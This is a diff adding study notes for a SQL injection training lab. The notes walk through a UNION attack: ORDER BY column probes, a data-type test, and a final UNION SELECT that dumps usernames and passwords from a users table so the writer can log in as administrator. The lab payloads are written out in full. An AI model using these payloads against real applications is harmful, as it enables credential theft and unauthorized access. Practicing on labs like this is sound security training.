@@ -1,0 +1,20 @@
+SQL Injection UNION attack, retrieving data from other tables
+
+To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, 
+and use the information to log in as the administrator user. 
+
+Analysis:
+--------
+
+1) Determine the number of columns that the vulnerable app is using
+' order by 1-- --> column is displayed on the page
+' order by 2-- --> column is displayed on the page
+' order by 3-- --> Internal Server error
+The app is using only 2 columns
+
+2) Determine the data types of the columns
+ union select 'a', 'a'-- --> both columns are displayed on the page
+ both columns contain text
+
+ 3)Retrieve data from target columns to display usernames and passwords
+ ' union select username, password from users--
